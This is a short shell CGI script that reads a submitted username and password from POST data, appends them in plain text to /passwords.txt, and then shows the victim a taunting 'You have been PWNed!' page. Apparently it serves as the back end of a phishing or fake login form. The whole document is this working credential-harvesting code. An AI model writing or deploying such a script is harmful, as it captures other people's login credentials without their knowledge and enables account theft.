#!/bin/sh
echo "Content-type: text/html"
echo

cat << EOF
<html>
<body>
EOF

read POST_DATA
USERNAME=$(echo $POST_DATA | cut -d '&' -f 1 | cut -d '=' -f 2)
PASSWORD=$(echo $POST_DATA | cut -d '&' -f 2 | cut -d '=' -f 2)

echo "$USERNAME, $PASSWORD" >> /passwords.txt

cat << EOF
<h1>You have been PWNed!</h1>

Your username and password has been saved to a file for our viewing pleasure :)
<br>
Have a good day!

<html>
<body>
EOF

exit 0
